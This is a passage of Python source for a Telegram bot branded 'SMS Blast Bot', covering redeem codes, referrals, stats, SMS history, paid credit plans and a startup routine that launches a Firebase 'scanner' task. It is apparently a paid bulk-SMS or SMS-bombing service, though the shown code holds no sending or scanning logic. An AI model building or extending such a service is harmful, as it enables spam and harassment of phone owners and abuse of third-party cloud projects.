    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nApna redeem code enter karein:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML",
    )


@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = (msg.text or "").strip().upper()
    await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid redeem code!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    code_data = codes[code]
    if code_data.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Ye code expire ho gaya hai!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    if uid in code_data.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap pehle se ye code use kar chuke hain!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    credits = code_data["credits"]
    add_credits(uid, credits, d)
    code_data["uses_left"] = code_data.get("uses_left", 1) - 1
    code_data.setdefault("used_by", []).append(uid)
    save(d)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Successful!</b>\n\n+{credits} credits added!\nBalance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👥')} <b>Referral Program</b>\n\n"
        f"Har successful referral pe <b>{ref_credits}</b> credits!\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Your Code: <code>{esc(code)}</code>\n"
        f"https://t.me/{esc(me.username)}?start={esc(code)}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d.get("users", {}).get(str(uid), {})
    stats = d.get("stats", {})
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"{em(EMOJI_STAR, '📈')} Bot Total Sent: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    history = d.get("sms_history", {}).get(str(cq.from_user.id), [])[-10:]
    if not history:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b>\n\n<i>Abhi tak koi SMS send nahi kiya.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b> (Last 10)\n"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = esc(mask_number(entry.get("number", "Unknown")))
            msg_preview = esc(entry.get("message", "")[:30])
            status = entry.get("status", "unknown")
            status_icon = em(EMOJI_CHECK, "✅") if status == "sent" else em(EMOJI_CROSS, "🛑") if status == "stopped" else em(EMOJI_WARNING, "⏳")
            lines.append(f"{i}. [{ts}] {status_icon} <code>{num}</code> — {msg_preview}...")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")


@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    plans = load().get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Abhi koi plan available nahi!", show_alert=True)
        return
    text = f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\n"
    rows = []
    for plan in plans:
        text += (
            f"{em(EMOJI_STAR, '📋')} <b>{esc(plan['name'])}</b>\n"
            f"   {em(EMOJI_MONEY, '💰')} Price: <b>{esc(plan['price'])} {esc(plan.get('currency', 'INR'))}</b>\n"
            f"   {em(EMOJI_GIFT, '🎁')} Credits: <b>{esc(plan['credits'])}</b>\n\n"
        )
        rows.append([btn_url(f"Buy {sc(plan['name'][:20])}", plan["payment_link"], EMOJI_MONEY, "💳", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {esc(_VERSION)}</b>\n\n"
        f"{em(EMOJI_CROWN, '👤')} Creator: <b>FLEXXYYY</b>\n"
        f"{em(EMOJI_STAR, '👑')} Owner: <a href='{esc(SUPER_ADMIN_LINK)}'>{esc(SUPER_ADMIN_NAME)}</a>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True,
    )


@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()


@R.errors()
async def global_error_handler(event, exception):
    log.error(f"Unhandled update error: {exception}", exc_info=True)
    return True


async def main():
    d_boot = load()
    sync_runtime_state(d_boot)
    save(d_boot)

    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    me = await bot.get_me()
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")

    asyncio.create_task(background_firebase_scanner(bot))
    asyncio.create_task(auto_broadcast_worker(bot))

    try:
        await play_startup_aesthetic(bot, MAIN_OWNER)
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>BOT MADE BY FLEXXYYY — ONLINE!</b>\n@{esc(me.username)}\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"{em(EMOJI_FIRE, '🧹')} <b>Bulk Clean Bad Firebase:</b> ENABLED\n"
            f"{em(EMOJI_BELL, '🔔')} <b>Auto 1-Min Msg (Auto-Delete Old):</b> ENABLED\n"
            f"{em(EMOJI_ROCKET, '⚡')} <b>Fast Speed & Error Resilience:</b> ENABLED",
            parse_mode="HTML",
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    while True:
        try:
            await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
            break
        except asyncio.CancelledError:
            break
        except Exception as e:
            log.error(f"Polling error, restarting in 3s: {e}")
            await asyncio.sleep(3)

    await close_http_session()


if __name__ == "__main__":
    while True:
        try:
            asyncio.run(main())
            break
        except KeyboardInterrupt:
            break
        except Exception as e:
            log.error(f"Fatal runner error, restarting in 3s: {e}")
            time.sleep(3)
